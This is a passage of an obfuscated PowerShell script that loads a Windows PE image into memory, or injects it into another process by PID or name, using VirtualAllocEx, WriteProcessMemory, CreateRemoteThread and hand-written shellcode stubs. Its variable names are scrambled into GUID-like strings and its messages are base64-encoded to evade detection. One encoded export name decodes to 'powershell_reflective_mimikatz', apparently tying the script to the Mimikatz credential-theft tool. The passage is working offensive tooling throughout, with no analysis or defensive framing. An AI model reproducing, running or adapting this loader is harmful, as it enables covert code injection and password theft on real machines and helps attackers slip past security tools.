				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAIABtAGUAbQBvAHIAeQAgAHAAcgBvAHQAZQBjAHQAaQBvAG4AIABmAGwAYQBnAHMA')))
				Update-MemoryProtectionFlags -c8edec2d3caf433f9746e28faa91f6ff ${c8edec2d3caf433f9746e28faa91f6ff} -a36b17e7e2e643b69f9b9e1a2bd60bb9 ${a36b17e7e2e643b69f9b9e1a2bd60bb9} -bf6addb5678a4306bbd927c2e94d4ede ${bf6addb5678a4306bbd927c2e94d4ede} -c3c389d397344cdcb031960f029f7926 ${c3c389d397344cdcb031960f029f7926}
			}
			else
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAYgBlAGkAbgBnACAAcgBlAGYAbABlAGMAdABpAHYAZQBsAHkAIABsAG8AYQBkAGUAZAAgAGkAcwAgAG4AbwB0ACAAYwBvAG0AcABhAHQAaQBiAGwAZQAgAHcAaQB0AGgAIABOAFgAIABtAGUAbQBvAHIAeQAsACAAawBlAGUAcABpAG4AZwAgAG0AZQBtAG8AcgB5ACAAYQBzACAAcgBlAGEAZAAgAHcAcgBpAHQAZQAgAGUAeABlAGMAdQB0AGUA')))
			}
		}
		else
		{
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAYgBlAGkAbgBnACAAbABvAGEAZABlAGQAIABpAG4AIAB0AG8AIABhACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACwAIABuAG8AdAAgAGEAZABqAHUAcwB0AGkAbgBnACAAbQBlAG0AbwByAHkAIABwAGUAcgBtAGkAcwBzAGkAbwBuAHMA')))
		}
		if (${0d562d8a696e463abdc2da2b4cc9ed68} -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			${aa485f490a6d4dbcb08ed9a0e7f41001} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.WriteProcessMemory.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, ${402f31e6c94945249a36d4b37bc43339}, ${ae6ce24b24854af29680b1afe7ddb45a}, [UIntPtr](${c8edec2d3caf433f9746e28faa91f6ff}.SizeOfImage), [Ref]$NumBytesWritten)
			if (${aa485f490a6d4dbcb08ed9a0e7f41001} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
			}
		}
		if (${c8edec2d3caf433f9746e28faa91f6ff}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA'))))
		{
			if (${0d562d8a696e463abdc2da2b4cc9ed68} -eq $false)
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGQAbABsAG0AYQBpAG4AIABzAG8AIAB0AGgAZQAgAEQATABMACAAawBuAG8AdwBzACAAaQB0ACAAaABhAHMAIABiAGUAZQBuACAAbABvAGEAZABlAGQA')))
				${64d1f0010ca64cc08d99870be3bc25b0} = Add-SignedIntAsUnsigned (${c8edec2d3caf433f9746e28faa91f6ff}.PEHandle) (${c8edec2d3caf433f9746e28faa91f6ff}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				${92233dbd6a4c4e6aa7624024e53902fb} = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				${2b925137583e4c9cb66e4282b7d23133} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${64d1f0010ca64cc08d99870be3bc25b0}, ${92233dbd6a4c4e6aa7624024e53902fb})
				${2b925137583e4c9cb66e4282b7d23133}.Invoke(${c8edec2d3caf433f9746e28faa91f6ff}.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				${64d1f0010ca64cc08d99870be3bc25b0} = Add-SignedIntAsUnsigned (${402f31e6c94945249a36d4b37bc43339}) (${c8edec2d3caf433f9746e28faa91f6ff}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				if (${c8edec2d3caf433f9746e28faa91f6ff}.PE64Bit -eq $true)
				{
					${712854bbec2941c68cddcadaa1d80e1a} = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					${a9e29640c8834c21ba4503ddd6226554} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					${d0a13c9b03094d3f888175a4e45a7ddf} = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					${712854bbec2941c68cddcadaa1d80e1a} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					${a9e29640c8834c21ba4503ddd6226554} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					${d0a13c9b03094d3f888175a4e45a7ddf} = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				${4af5a9f574b6494298ae9f4ee83f56b7} = ${712854bbec2941c68cddcadaa1d80e1a}.Length + ${a9e29640c8834c21ba4503ddd6226554}.Length + ${d0a13c9b03094d3f888175a4e45a7ddf}.Length + (${acafad3a2a75412893cf40bcdc32329b} * 2)
				${9b72a66f00a64c5cb5c47a7bf44c7b7b} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${4af5a9f574b6494298ae9f4ee83f56b7})
				${4c46ae8af4724383abfdb3ea89625a14} = ${9b72a66f00a64c5cb5c47a7bf44c7b7b}
				Write-BytesToMemory -ec206491ad3f4128af1a77bc1c4928e7 ${712854bbec2941c68cddcadaa1d80e1a} -af6d51d057d949f4a6df10d4847caeef ${9b72a66f00a64c5cb5c47a7bf44c7b7b}
				${9b72a66f00a64c5cb5c47a7bf44c7b7b} = Add-SignedIntAsUnsigned ${9b72a66f00a64c5cb5c47a7bf44c7b7b} (${712854bbec2941c68cddcadaa1d80e1a}.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${402f31e6c94945249a36d4b37bc43339}, ${9b72a66f00a64c5cb5c47a7bf44c7b7b}, $false)
				${9b72a66f00a64c5cb5c47a7bf44c7b7b} = Add-SignedIntAsUnsigned ${9b72a66f00a64c5cb5c47a7bf44c7b7b} (${acafad3a2a75412893cf40bcdc32329b})
				Write-BytesToMemory -ec206491ad3f4128af1a77bc1c4928e7 ${a9e29640c8834c21ba4503ddd6226554} -af6d51d057d949f4a6df10d4847caeef ${9b72a66f00a64c5cb5c47a7bf44c7b7b}
				${9b72a66f00a64c5cb5c47a7bf44c7b7b} = Add-SignedIntAsUnsigned ${9b72a66f00a64c5cb5c47a7bf44c7b7b} (${a9e29640c8834c21ba4503ddd6226554}.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${64d1f0010ca64cc08d99870be3bc25b0}, ${9b72a66f00a64c5cb5c47a7bf44c7b7b}, $false)
				${9b72a66f00a64c5cb5c47a7bf44c7b7b} = Add-SignedIntAsUnsigned ${9b72a66f00a64c5cb5c47a7bf44c7b7b} (${acafad3a2a75412893cf40bcdc32329b})
				Write-BytesToMemory -ec206491ad3f4128af1a77bc1c4928e7 ${d0a13c9b03094d3f888175a4e45a7ddf} -af6d51d057d949f4a6df10d4847caeef ${9b72a66f00a64c5cb5c47a7bf44c7b7b}
				${9b72a66f00a64c5cb5c47a7bf44c7b7b} = Add-SignedIntAsUnsigned ${9b72a66f00a64c5cb5c47a7bf44c7b7b} (${d0a13c9b03094d3f888175a4e45a7ddf}.Length)
				${92a04d86d9784071a611d48fc87b87c3} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualAllocEx.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, [IntPtr]::Zero, [UIntPtr][UInt64]${4af5a9f574b6494298ae9f4ee83f56b7}, ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_COMMIT -bor ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_RESERVE, ${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_EXECUTE_READWRITE)
				if (${92a04d86d9784071a611d48fc87b87c3} -eq [IntPtr]::Zero)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
				}
				${aa485f490a6d4dbcb08ed9a0e7f41001} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.WriteProcessMemory.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, ${92a04d86d9784071a611d48fc87b87c3}, ${4c46ae8af4724383abfdb3ea89625a14}, [UIntPtr][UInt64]${4af5a9f574b6494298ae9f4ee83f56b7}, [Ref]$NumBytesWritten)
				if ((${aa485f490a6d4dbcb08ed9a0e7f41001} -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]${4af5a9f574b6494298ae9f4ee83f56b7}))
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
				}
				${7136749d9ce64f46ae0440186d4f6c1c} = Invoke-CreateRemoteThread -d5e70cc477d14906a24cf0452a1000e4 ${bc96a39c79d24a35b88ba52e143fe2a2} -dfccdc8a8c7748d3bab1a84f860772a5 ${92a04d86d9784071a611d48fc87b87c3} -a36b17e7e2e643b69f9b9e1a2bd60bb9 ${a36b17e7e2e643b69f9b9e1a2bd60bb9}
				${94d54b9f2d6c4bfd9a1438bad15bbcc2} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.WaitForSingleObject.Invoke(${7136749d9ce64f46ae0440186d4f6c1c}, 20000)
				if (${94d54b9f2d6c4bfd9a1438bad15bbcc2} -ne 0)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
				}
				${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualFreeEx.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, ${92a04d86d9784071a611d48fc87b87c3}, [UIntPtr][UInt64]0, ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_RELEASE) | Out-Null
			}
		}
		elseif (${c8edec2d3caf433f9746e28faa91f6ff}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUA'))))
		{
			[IntPtr]${c234f2cf0d9b4e839141a97336592954} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte(${c234f2cf0d9b4e839141a97336592954}, 0, 0x00)
			${ae8ca31cacaa48fab6d86b16153165bc} = Update-ExeFunctions -c8edec2d3caf433f9746e28faa91f6ff ${c8edec2d3caf433f9746e28faa91f6ff} -a36b17e7e2e643b69f9b9e1a2bd60bb9 ${a36b17e7e2e643b69f9b9e1a2bd60bb9} -bf6addb5678a4306bbd927c2e94d4ede ${bf6addb5678a4306bbd927c2e94d4ede} -b0b21c684f9b487ca3e735309f04af90 ${bb61a355ebca4b4caf1b861559415a52} -c234f2cf0d9b4e839141a97336592954 ${c234f2cf0d9b4e839141a97336592954}
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned (${c8edec2d3caf433f9746e28faa91f6ff}.PEHandle) (${c8edec2d3caf433f9746e28faa91f6ff}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."
			${a36b17e7e2e643b69f9b9e1a2bd60bb9}.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte(${c234f2cf0d9b4e839141a97336592954}, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -b8c3444574d94e178e88580238a27e8f ${ae8ca31cacaa48fab6d86b16153165bc} -a36b17e7e2e643b69f9b9e1a2bd60bb9 ${a36b17e7e2e643b69f9b9e1a2bd60bb9} -bf6addb5678a4306bbd927c2e94d4ede ${bf6addb5678a4306bbd927c2e94d4ede}
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAIAB0AGgAcgBlAGEAZAAgAGgAYQBzACAAYwBvAG0AcABsAGUAdABlAGQALgA=')))
					break
				}
				else
				{
					sleep -Seconds 1
				}
			}
		}
		return @(${c8edec2d3caf433f9746e28faa91f6ff}.PEHandle, ${402f31e6c94945249a36d4b37bc43339})
	}
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${ae6ce24b24854af29680b1afe7ddb45a}
		)
		${bf6addb5678a4306bbd927c2e94d4ede} = Get-Win32Constants
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} = Get-Win32Functions
		${c3c389d397344cdcb031960f029f7926} = Get-Win32Types
		${c8edec2d3caf433f9746e28faa91f6ff} = Get-PEDetailedInfo -ae6ce24b24854af29680b1afe7ddb45a ${ae6ce24b24854af29680b1afe7ddb45a} -c3c389d397344cdcb031960f029f7926 ${c3c389d397344cdcb031960f029f7926} -bf6addb5678a4306bbd927c2e94d4ede ${bf6addb5678a4306bbd927c2e94d4ede}
		if (${c8edec2d3caf433f9746e28faa91f6ff}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]${e0e216f388464cdca071e9287ee61cf1} = Add-SignedIntAsUnsigned ([Int64]${c8edec2d3caf433f9746e28faa91f6ff}.PEHandle) ([Int64]${c8edec2d3caf433f9746e28faa91f6ff}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($true)
			{
				${72938473351447079f3b9317ad2c9cce} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${e0e216f388464cdca071e9287ee61cf1}, [Type]${c3c389d397344cdcb031960f029f7926}.IMAGE_IMPORT_DESCRIPTOR)
				if (${72938473351447079f3b9317ad2c9cce}.Characteristics -eq 0 `
						-and ${72938473351447079f3b9317ad2c9cce}.FirstThunk -eq 0 `
						-and ${72938473351447079f3b9317ad2c9cce}.ForwarderChain -eq 0 `
						-and ${72938473351447079f3b9317ad2c9cce}.Name -eq 0 `
						-and ${72938473351447079f3b9317ad2c9cce}.TimeDateStamp -eq 0)
				{
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAgAHUAbgBsAG8AYQBkAGkAbgBnACAAdABoAGUAIABsAGkAYgByAGEAcgBpAGUAcwAgAG4AZQBlAGQAZQBkACAAYgB5ACAAdABoAGUAIABQAEUA')))
					break
				}
				${4b48e9e7cba040e0bb53a7c8c26134db} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]${c8edec2d3caf433f9746e28faa91f6ff}.PEHandle) ([Int64]${72938473351447079f3b9317ad2c9cce}.Name)))
				${1a57a0bfef2a46c085d2380193e70907} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.GetModuleHandle.Invoke(${4b48e9e7cba040e0bb53a7c8c26134db})
				if (${1a57a0bfef2a46c085d2380193e70907} -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: ${4b48e9e7cba040e0bb53a7c8c26134db}. Continuing anyways" -WarningAction Continue
				}
				${aa485f490a6d4dbcb08ed9a0e7f41001} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.FreeLibrary.Invoke(${1a57a0bfef2a46c085d2380193e70907})
				if (${aa485f490a6d4dbcb08ed9a0e7f41001} -eq $false)
				{
					Write-Warning "Unable to free library: ${4b48e9e7cba040e0bb53a7c8c26134db}. Continuing anyways." -WarningAction Continue
				}
				${e0e216f388464cdca071e9287ee61cf1} = Add-SignedIntAsUnsigned (${e0e216f388464cdca071e9287ee61cf1}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]${c3c389d397344cdcb031960f029f7926}.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGQAbABsAG0AYQBpAG4AIABzAG8AIAB0AGgAZQAgAEQATABMACAAawBuAG8AdwBzACAAaQB0ACAAaQBzACAAYgBlAGkAbgBnACAAdQBuAGwAbwBhAGQAZQBkAA==')))
		${64d1f0010ca64cc08d99870be3bc25b0} = Add-SignedIntAsUnsigned (${c8edec2d3caf433f9746e28faa91f6ff}.PEHandle) (${c8edec2d3caf433f9746e28faa91f6ff}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		${92233dbd6a4c4e6aa7624024e53902fb} = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		${2b925137583e4c9cb66e4282b7d23133} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${64d1f0010ca64cc08d99870be3bc25b0}, ${92233dbd6a4c4e6aa7624024e53902fb})
		${2b925137583e4c9cb66e4282b7d23133}.Invoke(${c8edec2d3caf433f9746e28faa91f6ff}.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		${aa485f490a6d4dbcb08ed9a0e7f41001} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualFree.Invoke(${ae6ce24b24854af29680b1afe7ddb45a}, [UInt64]0, ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_RELEASE)
		if (${aa485f490a6d4dbcb08ed9a0e7f41001} -eq $false)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAAVgBpAHIAdAB1AGEAbABGAHIAZQBlACAAbwBuACAAdABoAGUAIABQAEUAJwBzACAAbQBlAG0AbwByAHkALgAgAEMAbwBuAHQAaQBuAHUAaQBuAGcAIABhAG4AeQB3AGEAeQBzAC4A'))) -WarningAction Continue
		}
	}
	Function Main
	{
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} = Get-Win32Functions
		${c3c389d397344cdcb031960f029f7926} = Get-Win32Types
		${bf6addb5678a4306bbd927c2e94d4ede} =  Get-Win32Constants
		${bc96a39c79d24a35b88ba52e143fe2a2} = [IntPtr]::Zero
		if ((${52fc94f570444d679a0e79f6f1787ce8} -ne $null) -and (${52fc94f570444d679a0e79f6f1787ce8} -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AJwB0ACAAcwB1AHAAcABsAHkAIABhACAAUAByAG8AYwBJAGQAIABhAG4AZAAgAFAAcgBvAGMATgBhAG0AZQAsACAAYwBoAG8AbwBzAGUAIABvAG4AZQAgAG8AcgAgAHQAaABlACAAbwB0AGgAZQByAA==')))
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			${f698b1717609457a8b0b7b9cf29f219a} = @(ps -Name $ProcName -ErrorAction SilentlyContinue)
			if (${f698b1717609457a8b0b7b9cf29f219a}.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif (${f698b1717609457a8b0b7b9cf29f219a}.Count -gt 1)
			{
				${967c65b83c2444068ae15d8319fd5960} = ps | where { $_.Name -eq $ProcName } | select ProcessName, Id, SessionId
				echo ${967c65b83c2444068ae15d8319fd5960}
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				${52fc94f570444d679a0e79f6f1787ce8} = ${f698b1717609457a8b0b7b9cf29f219a}[0].ID
			}
		}
		if ((${52fc94f570444d679a0e79f6f1787ce8} -ne $null) -and (${52fc94f570444d679a0e79f6f1787ce8} -ne 0))
		{
			${bc96a39c79d24a35b88ba52e143fe2a2} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.OpenProcess.Invoke(0x001F0FFF, $false, ${52fc94f570444d679a0e79f6f1787ce8})
			if (${bc96a39c79d24a35b88ba52e143fe2a2} -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: ${52fc94f570444d679a0e79f6f1787ce8}"
			}
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBvAHQAIAB0AGgAZQAgAGgAYQBuAGQAbABlACAAZgBvAHIAIAB0AGgAZQAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAHQAbwAgAGkAbgBqAGUAYwB0ACAAaQBuACAAdABvAA==')))
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAEkAbgB2AG8AawBlAC0ATQBlAG0AbwByAHkATABvAGEAZABMAGkAYgByAGEAcgB5AA==')))
        try
        {
            ${898d96ff3dda4f58952e561cb4e634c8} = gwmi -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }
        if (${898d96ff3dda4f58952e561cb4e634c8} -is [array])
        {
            ${29a46feef7b34b3ca845d9287d27c40c} = ${898d96ff3dda4f58952e561cb4e634c8}[0]
        } else {
            ${29a46feef7b34b3ca845d9287d27c40c} = ${898d96ff3dda4f58952e561cb4e634c8}
        }
        if ( ( ${29a46feef7b34b3ca845d9287d27c40c}.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUAOgAgAA=='))) + ${29a46feef7b34b3ca845d9287d27c40c}.AddressWidth + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABQAHIAbwBjAGUAcwBzADoAIAA='))) + ([System.IntPtr]::Size * 8))
            Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAGEAcgBjAGgAaQB0AGUAYwB0AHUAcgBlACAAKAAzADIAYgBpAHQALwA2ADQAYgBpAHQAKQAgAGQAbwBlAHMAbgAnAHQAIABtAGEAdABjAGgAIABPAFMAIABhAHIAYwBoAGkAdABlAGMAdAB1AHIAZQAuACAANgA0AGIAaQB0ACAAUABTACAAbQB1AHMAdAAgAGIAZQAgAHUAcwBlAGQAIABvAG4AIABhACAANgA0AGIAaQB0ACAATwBTAC4A'))) -ErrorAction Stop
        }
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]${dc16372125974a299ad4aa82bcfa6b2d} = [Byte[]][Convert]::FromBase64String(${360960a075984de898e66eda1d968418})
        }
        else
        {
            [Byte[]]${dc16372125974a299ad4aa82bcfa6b2d} = [Byte[]][Convert]::FromBase64String(${e56b8ae36bd44ada8ecc03c11b928101})
        }
        ${dc16372125974a299ad4aa82bcfa6b2d}[0] = 0
        ${dc16372125974a299ad4aa82bcfa6b2d}[1] = 0
		${ae6ce24b24854af29680b1afe7ddb45a} = [IntPtr]::Zero
		if (${bc96a39c79d24a35b88ba52e143fe2a2} -eq [IntPtr]::Zero)
		{
			${2167ed52ff504148b054d24cf76084ae} = Invoke-MemoryLoadLibrary -dc16372125974a299ad4aa82bcfa6b2d ${dc16372125974a299ad4aa82bcfa6b2d} -bb61a355ebca4b4caf1b861559415a52 ${bb61a355ebca4b4caf1b861559415a52}
		}
		else
		{
			${2167ed52ff504148b054d24cf76084ae} = Invoke-MemoryLoadLibrary -dc16372125974a299ad4aa82bcfa6b2d ${dc16372125974a299ad4aa82bcfa6b2d} -bb61a355ebca4b4caf1b861559415a52 ${bb61a355ebca4b4caf1b861559415a52} -bc96a39c79d24a35b88ba52e143fe2a2 ${bc96a39c79d24a35b88ba52e143fe2a2}
		}
		if (${2167ed52ff504148b054d24cf76084ae} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABsAG8AYQBkACAAUABFACwAIABoAGEAbgBkAGwAZQAgAHIAZQB0AHUAcgBuAGUAZAAgAGkAcwAgAE4AVQBMAEwA')))
		}
		${ae6ce24b24854af29680b1afe7ddb45a} = ${2167ed52ff504148b054d24cf76084ae}[0]
		${1bd97d065e534a03ab9d87455fc41862} = ${2167ed52ff504148b054d24cf76084ae}[1] 
		${c8edec2d3caf433f9746e28faa91f6ff} = Get-PEDetailedInfo -ae6ce24b24854af29680b1afe7ddb45a ${ae6ce24b24854af29680b1afe7ddb45a} -c3c389d397344cdcb031960f029f7926 ${c3c389d397344cdcb031960f029f7926} -bf6addb5678a4306bbd927c2e94d4ede ${bf6addb5678a4306bbd927c2e94d4ede}
		if ((${c8edec2d3caf433f9746e28faa91f6ff}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))) -and (${bc96a39c79d24a35b88ba52e143fe2a2} -eq [IntPtr]::Zero))
		{
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABXAFMAdAByAGkAbgBnACAAcgBlAHQAdQByAG4AIAB0AHkAcABlAA==')))
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -ae6ce24b24854af29680b1afe7ddb45a ${ae6ce24b24854af29680b1afe7ddb45a} -ef958cd51d3144759d0cfc0a4b45bd60 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABvAHcAZQByAHMAaABlAGwAbABfAHIAZQBmAGwAZQBjAHQAaQB2AGUAXwBtAGkAbQBpAGsAYQB0AHoA')))
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
				    }
				    ${044eb51cb32349bfb7bb105edd6af026} = Get-DelegateType @([IntPtr]) ([IntPtr])
				    ${9eec847d98bf4ade978ea80436fee773} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, ${044eb51cb32349bfb7bb105edd6af026})
                    ${eb0a0e531dbd44f3bc083a32c472315d} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${bb61a355ebca4b4caf1b861559415a52})
				    [IntPtr]$OutputPtr = ${9eec847d98bf4ade978ea80436fee773}.Invoke(${eb0a0e531dbd44f3bc083a32c472315d})
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${eb0a0e531dbd44f3bc083a32c472315d})
				    if ($OutputPtr -eq [IntPtr]::Zero)
				    {
				    	Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAG8AdQB0AHAAdQB0ACwAIABPAHUAdABwAHUAdAAgAFAAdAByACAAaQBzACAATgBVAEwATAA=')))
				    }
				    else
				    {
				        ${f402f9d607da4e398d19769c2acd960c} = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				        echo ${f402f9d607da4e398d19769c2acd960c}
				        ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.LocalFree.Invoke($OutputPtr);
				    }
		}
		elseif ((${c8edec2d3caf433f9746e28faa91f6ff}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))) -and (${bc96a39c79d24a35b88ba52e143fe2a2} -ne [IntPtr]::Zero))
		{
			${86dbf0f709ed4627b6a61a3282e52f88} = Get-MemoryProcAddress -ae6ce24b24854af29680b1afe7ddb45a ${ae6ce24b24854af29680b1afe7ddb45a} -ef958cd51d3144759d0cfc0a4b45bd60 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjAA==')))
			if ((${86dbf0f709ed4627b6a61a3282e52f88} -eq $null) -or (${86dbf0f709ed4627b6a61a3282e52f88} -eq [IntPtr]::Zero))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjACAAYwBvAHUAbABkAG4AJwB0ACAAYgBlACAAZgBvAHUAbgBkACAAaQBuACAAdABoAGUAIABEAEwATAA=')))
			}
			${86dbf0f709ed4627b6a61a3282e52f88} = Sub-SignedIntAsUnsigned ${86dbf0f709ed4627b6a61a3282e52f88} ${ae6ce24b24854af29680b1afe7ddb45a}
			${86dbf0f709ed4627b6a61a3282e52f88} = Add-SignedIntAsUnsigned ${86dbf0f709ed4627b6a61a3282e52f88} ${1bd97d065e534a03ab9d87455fc41862}
